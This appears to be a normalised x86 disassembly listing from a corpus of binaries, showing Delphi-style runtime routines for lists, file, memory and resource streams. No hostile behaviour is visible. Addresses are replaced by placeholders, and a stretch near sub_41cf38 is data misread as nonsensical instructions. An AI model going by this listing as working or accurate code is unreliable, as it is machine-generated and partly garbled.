mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41c100
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_40405c
pop edi
pop esi
pop ebx
retn
sub_41c13c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41c164
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41c198
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b738
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41c1e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b470
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41c238
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41c164
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40405c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_402998
sub_41c2b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b470
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41c30c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b470
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41c34c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c064
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c34c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41c3fc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41c458
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41c34c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41c4ac
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41c4e0
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41c544
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41c598
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
mov esp ebp
pop ebp
retn
sub_41c5e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40317c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41c598
pop ecx
mov eax [ ebx ]
call sub_4031c0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41c598
pop ecx
sub_41c668
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41c6d8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
sub_41c710
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
sub_41c748
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41c4cc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_40279c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41c824
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c82b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4027bc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41c6d8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41c710
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41c83c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cec0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c88c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41eef4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c893
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_41c89c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c8f8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4087a4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41c938
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d064
pop ebx
pop ebp
retn 0x8
sub_41c960
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41c9a4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c9a4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41cacd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403558
movzx edx di
mov eax esi
call sub_4086c8
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c89c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408744
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c89c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cad4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4088e4
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b1b4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4088e4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b1b4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
jmp r-xdata
sub_41cad4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41caf8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
call sub_4087dc
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41cb34
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402998
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41cb6c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41cb90
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_41cbbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41cbd4
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41c4cc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41c6d8
sub_41cc0c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41cb2c
mov eax [ esp ]
sub_41cc34
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41cc0c
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41cc60
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406db8
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406d9c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406d8c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
test ecx ecx
jne r-xdata
sub_41ccec
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402998
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41cc0c
sub_41cd3c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044c8
mov ecx eax
mov edx esi
mov eax edi
call sub_41ce04
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41cd94
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cdf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdfe
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41ce04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41cd94
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41cb2c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41cd94
pop ecx
sub_41ce70
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406d88
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41cec0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_40279c
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41cf08
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4027bc
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41cf38
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test bh cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x180041cf ] bl
add [ eax ] al
add [ eax ] cl
adc [ eax ] eax
jl r-xdata
int3
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24420fae
xor al [ eax ]
lodsb [ esi ]
rol [ ecx ] 0x1
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
sub_41cfb0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
iretd
sub_41d00c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40405c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40405c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d064
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040f8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404568
mov al 0x1
inc ebx
sub_41d0bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d133
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405a38
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4174a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d13a
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_416634
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405a38
mov ecx eax
mov eax esi
pop edx
call sub_40d558
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405a38
sub_41d140
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41d1e6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1ed
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420c1c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408110
test al al
je r-xdata
inc ebx
